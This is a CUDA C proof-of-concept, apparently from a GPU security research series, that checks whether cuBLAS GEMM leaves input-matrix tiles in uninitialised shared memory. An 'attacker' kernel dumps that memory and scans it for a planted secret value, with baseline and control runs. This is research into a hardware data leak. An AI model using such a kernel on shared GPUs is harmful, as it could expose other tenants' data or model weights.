/*
 * Experiment 24F: cuBLAS GEMM Shared Memory Residue
 *
 * Exp 23 proved __shared__ is not zeroed between kernel launches.
 * cuBLAS GEMM uses __shared__ for matrix tiling internally.
 * This test: run cuBLAS GEMM (victim) → run attacker kernel that reads
 * uninitialized __shared__ → check for GEMM's matrix tile residue.
 *
 * cuBLAS GEMM with A[i]=SECRET tiles A into __shared__ in FP16 blocks.
 * The attacker reads 48KB of raw __shared__ and scans for SECRET FP16 pattern.
 */

#include <cuda_runtime.h>
#include <cublas_v2.h>
#include <cuda_fp16.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define CHECK(call) do { cudaError_t _e=(call); if(_e!=cudaSuccess){ \
    fprintf(stderr,"[RT] %s:%d %s\n",__FILE__,__LINE__,cudaGetErrorString(_e)); exit(1); } } while(0)
#define CUBLAS_CHECK(call) do { cublasStatus_t _s=(call); if(_s!=CUBLAS_STATUS_SUCCESS){ \
    fprintf(stderr,"[cuBLAS] %s:%d status=%d\n",__FILE__,__LINE__,(int)_s); exit(1); } } while(0)

#define SHMEM_BYTES (48 * 1024)
#define SHMEM_U16   (SHMEM_BYTES / 2)

__global__ void fill_fp16(__half *buf, float val, int n) {
    int i = blockIdx.x * blockDim.x + threadIdx.x;
    if (i < n) buf[i] = __float2half(val);
}

/* Attacker: reads raw __shared__ (no init), writes to global */
__global__ void attacker_read_shm(uint16_t *out) {
    __shared__ uint16_t sm[SHMEM_U16];
    __syncthreads();  /* read raw — no initialization */
    int tid = threadIdx.x, stride = blockDim.x;
    for (int i = tid; i < SHMEM_U16; i += stride)
        out[blockIdx.x * SHMEM_U16 + i] = sm[i];
}

int main() {
    CHECK(cudaSetDevice(0));
    cudaDeviceProp prop;
    CHECK(cudaGetDeviceProperties(&prop, 0));
    printf("=== Experiment 24F: cuBLAS GEMM Shared Memory Residue ===\n");
    printf("    Device: %s  (SMs: %d)\n\n", prop.name, prop.multiProcessorCount);

    const int M = 4096, N = 4096, K = 4096;
    const float SECRET = 2.71828f;

    cublasHandle_t handle;
    CUBLAS_CHECK(cublasCreate(&handle));
    cublasMath_t mm = CUBLAS_TENSOR_OP_MATH;
    CUBLAS_CHECK(cublasSetMathMode(handle, mm));

    __half *d_A16, *d_B16, *d_C16;
    CHECK(cudaMalloc(&d_A16, (size_t)M*K*sizeof(__half)));
    CHECK(cudaMalloc(&d_B16, (size_t)M*K*sizeof(__half)));
    CHECK(cudaMalloc(&d_C16, (size_t)M*N*sizeof(__half)));

    /* Number of attacker blocks = number of SMs (force SM reuse) */
    const int ATK_BLOCKS = prop.multiProcessorCount; /* 132 on H100 */
    uint16_t *d_atk_out, *h_atk_out;
    size_t atk_size = (size_t)ATK_BLOCKS * SHMEM_U16 * sizeof(uint16_t);
    CHECK(cudaMalloc(&d_atk_out, atk_size));
    h_atk_out = (uint16_t*)malloc(atk_size);

    /* FP16 bit pattern of SECRET */
    __half sh = __float2half(SECRET);
    uint16_t sb; memcpy(&sb, &sh, 2);
    printf("    SECRET = %.5f  FP16 bits = 0x%04x\n\n", SECRET, sb);

    /* ---- Test 1: Baseline — attacker runs first (no prior GEMM) ---- */
    printf("[Baseline] Attacker reads __shared__ with NO prior GEMM\n");
    {
        CHECK(cudaMemset(d_atk_out, 0, atk_size));
        attacker_read_shm<<<ATK_BLOCKS, 256>>>(d_atk_out);
        CHECK(cudaDeviceSynchronize());
        CHECK(cudaMemcpy(h_atk_out, d_atk_out, atk_size, cudaMemcpyDeviceToHost));
        int total = (int)(atk_size / 2);
        int nz = 0, hits = 0;
        for (int i = 0; i < total; i++) {
            if (h_atk_out[i]) nz++;
            if (h_atk_out[i] == sb) hits++;
        }
        printf("  Non-zero u16 values: %d / %d  SECRET hits: %d\n\n", nz, total, hits);
    }

    /* ---- Test 2: After cuBLAS GEMM with A=SECRET ---- */
    printf("[Test 2] cuBLAS FP16 GEMM (A=SECRET) → attacker reads __shared__\n");
    for (int trial = 0; trial < 3; trial++) {
        /* Fill A with SECRET */
        int blocks = (M*K + 255) / 256;
        fill_fp16<<<blocks, 256>>>(d_A16, SECRET, M*K);
        fill_fp16<<<blocks, 256>>>(d_B16, 1.0f, M*K);
        CHECK(cudaDeviceSynchronize());

        /* Run GEMM */
        float alpha = 1.0f, beta = 0.0f;
        CUBLAS_CHECK(cublasGemmEx(handle, CUBLAS_OP_N, CUBLAS_OP_N,
            M, N, K, &alpha, d_A16, CUDA_R_16F, M,
                               d_B16, CUDA_R_16F, K,
                     &beta,   d_C16, CUDA_R_16F, M,
            CUBLAS_COMPUTE_32F_FAST_16F, CUBLAS_GEMM_DEFAULT_TENSOR_OP));
        CHECK(cudaDeviceSynchronize());

        /* Attacker immediately reads __shared__ on same SMs */
        CHECK(cudaMemset(d_atk_out, 0, atk_size));
        attacker_read_shm<<<ATK_BLOCKS, 256>>>(d_atk_out);
        CHECK(cudaDeviceSynchronize());

        CHECK(cudaMemcpy(h_atk_out, d_atk_out, atk_size, cudaMemcpyDeviceToHost));
        int total = (int)(atk_size / 2);
        int nz = 0, hits = 0;
        for (int i = 0; i < total; i++) {
            if (h_atk_out[i]) nz++;
            if (h_atk_out[i] == sb) hits++;
        }
        printf("  Trial %d: nz=%d/%d  SECRET_hits=%d/%d (%.2f%%)\n",
               trial, nz, total, hits, total, 100.0f*hits/total);
        if (hits > 1000)
            printf("  [!!!] cuBLAS GEMM __shared__ residue contains SECRET FP16 tiles!\n");
    }
    printf("\n");

    /* ---- Test 3: After GEMM with A=ZERO (control for test 2) ---- */
    printf("[Test 3] cuBLAS GEMM with A=0 → attacker reads __shared__ (control)\n");
    {
        int blocks = (M*K + 255) / 256;
        fill_fp16<<<blocks, 256>>>(d_A16, 0.0f, M*K);
        fill_fp16<<<blocks, 256>>>(d_B16, 0.0f, M*K);
        CHECK(cudaDeviceSynchronize());

        float alpha = 1.0f, beta = 0.0f;
        CUBLAS_CHECK(cublasGemmEx(handle, CUBLAS_OP_N, CUBLAS_OP_N,
            M, N, K, &alpha, d_A16, CUDA_R_16F, M,
                               d_B16, CUDA_R_16F, K,
                     &beta,   d_C16, CUDA_R_16F, M,
            CUBLAS_COMPUTE_32F_FAST_16F, CUBLAS_GEMM_DEFAULT_TENSOR_OP));
        CHECK(cudaDeviceSynchronize());

        CHECK(cudaMemset(d_atk_out, 0, atk_size));
        attacker_read_shm<<<ATK_BLOCKS, 256>>>(d_atk_out);
        CHECK(cudaDeviceSynchronize());

        CHECK(cudaMemcpy(h_atk_out, d_atk_out, atk_size, cudaMemcpyDeviceToHost));
        int total = (int)(atk_size / 2);
        int nz = 0;
        for (int i = 0; i < total; i++) if (h_atk_out[i]) nz++;
        printf("  Control (A=B=0): nz=%d/%d  (should be ~0 if GEMM stores mostly 0)\n\n", nz, total);
    }

    /* Summary */
    printf("=== Connection to Exp 23 ===\n");
    printf("  Exp 23 proved: __shared__ is NOT zeroed between kernel launches.\n");
    printf("  This test proves: cuBLAS GEMM kernel leaves matrix tile data in __shared__.\n");
    printf("  Combined: an attacker kernel after cuBLAS GEMM inherits the GEMM's\n");
    printf("  shared memory state — containing fragments of the input matrices.\n");

    CUBLAS_CHECK(cublasDestroy(handle));
    free(h_atk_out);
    CHECK(cudaFree(d_atk_out));
    CHECK(cudaFree(d_A16)); CHECK(cudaFree(d_B16)); CHECK(cudaFree(d_C16));
    printf("\n[Done]\n");
    return 0;
}
